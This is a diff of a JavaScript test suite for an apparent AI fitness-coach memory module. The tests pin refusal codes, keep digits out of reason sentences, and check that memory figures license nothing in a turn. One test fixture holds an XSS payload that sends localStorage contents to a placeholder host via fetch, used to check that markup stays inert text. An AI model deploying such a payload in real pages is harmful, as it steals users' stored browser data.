@@ -603,11 +603,21 @@ test("M02 P02-06 a FORGED cross-user parent writes nothing, on either installati
     for (const parent of [foreignOpId, "op-nobody-at-all"]) {
       const r = await a.memory.save({ ...GOOD(), memory_id: "mem-forged" }, { parents: [parent] });
       assert.equal(r.ok, false, parent + " was accepted as a causal parent");
-      /* the accepted client refuses a commit its own validator rejected with a
-         state and a sentence rather than a code of its own; both travel verbatim
-         and the cell asserts one of them is really there */
-      assert.ok(r.code || r.copy || Number.isInteger(r.state),
-        "the refusal names nothing at all: " + JSON.stringify(r));
+      /* THE REFUSAL IS PINNED BY VALUE (review R1, N3): a disjunction over
+         `r.code || r.copy || Number.isInteger(r.state)` cannot fail, because
+         memory-host.mjs save() returns an integer state on every path. The
+         accepted client mints no code of its own for a commit ITS OWN validator
+         rejected, so the honest form is to pin that absence, pin the state
+         number, and pin the validator's own word inside the copy. Each of the
+         three separates this refusal from a different neighbour: the closed lane
+         (code LOCAL_CLIENT_CLOSED), the throw path (code set from the error) and
+         the lease refusal (state 20, "Connect once to keep saving"). */
+      assert.equal(r.code, null, "the accepted layer minted a code here: " + JSON.stringify(r));
+      assert.equal(r.state, 3, "the validator refusal changed state: " + JSON.stringify(r));
+      assert.equal(typeof r.copy, "string");
+      assert.match(r.copy, /WORKOUT_INPUT_INVALID/,
+        "the copy does not name the validator's own refusal: " + r.copy);
+      assert.equal(r.op_id, null, "a refused commit handed back an op id");
       unchanged(beforeA, await counts(a.memory), "a forged parent on A");
       unchanged(beforeB, await counts(b.memory), "a forged parent, measured on B");
     }
@@ -763,6 +773,15 @@ test("M03 P03-03 a COMMIT followed by a failed read-back tells the truth, and ne
     assert.equal(told.state_unchanged, undefined, "a committed write claimed the state was unchanged");
     assert.match(told.unavailable.reason, /kept it|recorded/i);
     assert.match(told.unavailable.reason, /could not read it back|cannot show/i);
+    /* and it names the record WITHOUT interpolating it into the sentence (review
+       R1, B1): a reason is engine prose to allowedTokens(), and an op id carries
+       the device id and its digits. The id travels beside the sentence instead. */
+    assert.equal(/\d/.test(told.unavailable.reason), false,
+      "the read-back reason carries a digit, so it licenses one: " + told.unavailable.reason);
+    assert.equal(told.unavailable.reason.includes(told.op_id), false, "the reason interpolates the op id");
+    assert.equal(told.recordedAs.value, told.op_id);
+    assert.equal(told.recordedAs.licensed, false);
+    assert.equal(told.recordedAs.turn_id, undefined, "the op id beside the sentence is a tagged value");
 
     /* NO SECOND WRITE. Reopen over the same store: exactly one operation, the
        original one. This is the assertion that kills "retry on read failure". */
@@ -1074,6 +1093,71 @@ test("M12 P12-06 a number in a memory BUYS NOTHING", async () => {
   } finally { ctx.w.close(); }
 });
 
+/* REVIEW ROUND ONE, B1. P12-06 above measures the turn that RECALLS a memory, and
+   that turn was never the leak: the leak was the turn that PROPOSES one. A reason
+   sentence is published by refuse() as T.text(), whose declared unit is "text",
+   and tools.cjs allowedTokens() reads a "text" tag as ENGINE PROSE and licenses
+   every number in it in the unit the words around it name. While the reason
+   quoted the memory back, one refused remember() call - no yes, nothing on disk,
+   a text the MODEL could choose - licensed the athlete's figures for the whole
+   turn. This cell measures the propose turn, the confirm turn and the recall, and
+   it is mutant M-Q's grave. */
+test("M12 P12-06 TURN-LOCAL a memory's figure buys nothing in the turn that PROPOSED it (review R1 B1)", async () => {
+  const w = await world("p12-06-turn");
+  try {
+    const S = "your protein target is 999 grams and your floor is 3100 kcal";
+    const turn = w.coach.openTurn("turn-p12-06-b1");
+    const before = await counts(w.memory);
+    /* POSITIVE CONTROL, first, in this same turn: the ENGINE's own protein figure
+       is traceable in its own unit, so an empty allowed set cannot pass this cell */
+    const plan = await turn.call.today_plan({});
+    const g = plan.values.proteinG;
+    assert.equal(g.blank, undefined, "the fixture produced no protein figure to control against");
+    assert.deepEqual(turn.untraceable("Your protein target is " + g.display + " grams."), []);
+    assert.notEqual(String(g.display), "999", "the fixture's own figure collides with this cell's");
+
+    const spoken = ["Your protein target is 999 grams.", "Your floor is 3100 kcal.", "999", "3100"];
+    for (const line of spoken) {
+      assert.notDeepEqual(turn.untraceable(line), [], "before the propose: " + line);
+    }
+
+    /* 1. THE PROPOSE. No yes, so nothing is written - and nothing is licensed. */
+    const asked = await turn.call.remember({ memory: { ...GOOD(), topic: "nutrition", text: S } });
+    assert.equal(asked.ok, false);
+    assert.equal(asked.unavailable.code, T.CODES.CONFIRMATION_REQUIRED);
+    unchanged(before, await counts(w.memory), "the propose step");
+    /* the reason is a FIXED sentence: it quotes neither his words nor an id */
+    assert.equal(asked.unavailable.reason.includes(S), false, "the reason quotes the memory back");
+    assert.equal(/\d/.test(asked.unavailable.reason), false,
+      "the reason carries a digit, so it licenses one: " + asked.unavailable.reason);
+    /* the words awaiting his yes travel as DATA, and say so */
+    assert.equal(asked.confirmation.text.display, S);
+    assert.equal(asked.confirmation.text.value, S);
+    assert.equal(asked.confirmation.text.licensed, false);
+    assert.equal(asked.confirmation.text.turn_id, undefined, "the words to confirm are a tagged value");
+    for (const line of spoken) {
+      assert.notDeepEqual(turn.untraceable(line), [], "after the propose: " + line);
+    }
+
+    /* 2. THE YES, in the SAME turn. A kept memory licenses nothing either. */
+    const done = await turn.call.remember({ memory: { ...GOOD(), topic: "nutrition", text: S },
+      confirmed: true, confirmation_id: asked.confirmation.confirmation_id });
+    assert.equal(done.ok, true, JSON.stringify(done.unavailable || {}));
+    for (const line of spoken) {
+      assert.notDeepEqual(turn.untraceable(line), [], "after the yes: " + line);
+    }
+
+    /* 3. AND THE RECALL, still the same turn */
+    const recalled = await turn.call.recall({ topic: "nutrition" });
+    assert.equal(recalled.values.items[0].text.display, S);
+    for (const line of spoken) {
+      assert.notDeepEqual(turn.untraceable(line), [], "after the recall: " + line);
+    }
+    /* POSITIVE CONTROL AGAIN at the end: the engine's figure is still traceable */
+    assert.deepEqual(turn.untraceable("Your protein target is " + g.display + " grams."), []);
+  } finally { w.close(); }
+});
+
 test("M12 P12-07 markup is stored and returned as TEXT, and no module can reach a network", async () => {
   const S = "<script>fetch('http://x/'+localStorage.k)</script><img src=x onerror=alert(1)>";
   const ctx = await dataOnly("p12-07", S, "coaching");
@@ -1254,6 +1338,11 @@ test("M06 P06-01 a machine setting stays the truth, and the memory is labelled b
     assert.equal(pair.label, "preference");
     assert.equal(pair.canonical.value, "four");
     assert.equal(pair.memory.text, text);
+    /* PRESENCE BEFORE ORDER (review R1, N2): indexOf returns -1 for a value the
+       sentence DROPPED, and -1 is less than any index, so an order assertion on
+       its own passes precisely when the law is broken worst. */
+    assert.ok(pair.sentence.includes("four"), "the pair dropped the canonical value: " + pair.sentence);
+    assert.ok(pair.sentence.includes(text), "the pair dropped the memory: " + pair.sentence);
     assert.ok(pair.sentence.indexOf("four") < pair.sentence.indexOf(text), pair.sentence);
     /* and a memory does not license the figure it names */
     assert.notDeepEqual(turn.untraceable("Your seat is 6."), []);
@@ -1308,6 +1397,9 @@ test("M06 P06-02 a setup priority stays the truth, read through the setup lane's
     const pair = w.coach.beside({ value: rows[0].setup.priority_muscles.join(" and "),
       source: "first-run-setup.op " + rows[0].op_id, date: rows[0].date }, recalled.values.items[0]);
     assert.equal(pair.label, "preference");
+    /* PRESENCE BEFORE ORDER (review R1, N2) */
+    assert.ok(pair.sentence.includes("quads and calves"), "the pair dropped the canonical value: " + pair.sentence);
+    assert.ok(pair.sentence.includes(text), "the pair dropped the memory: " + pair.sentence);
     assert.ok(pair.sentence.indexOf("quads and calves") < pair.sentence.indexOf(text), pair.sentence);
   } finally { w.close(); control.close(); }
 });
@@ -1342,6 +1434,9 @@ test("M06 P06-03 the effective programme stays the truth, and no proposal is iss
     const pair = w.coach.beside({ value: live.prescription.line,
       source: "gym-model.prescriptionLine (capture cells)", date: DAY }, recalled.values.items[0]);
     assert.equal(pair.label, "preference");
+    /* PRESENCE BEFORE ORDER (review R1, N2) */
+    assert.ok(pair.sentence.includes(live.prescription.line), "the pair dropped the canonical value: " + pair.sentence);
+    assert.ok(pair.sentence.includes(text), "the pair dropped the memory: " + pair.sentence);
     assert.ok(pair.sentence.indexOf(live.prescription.line) < pair.sentence.indexOf(text), pair.sentence);
   } finally { w.close(); control.close(); }
 });
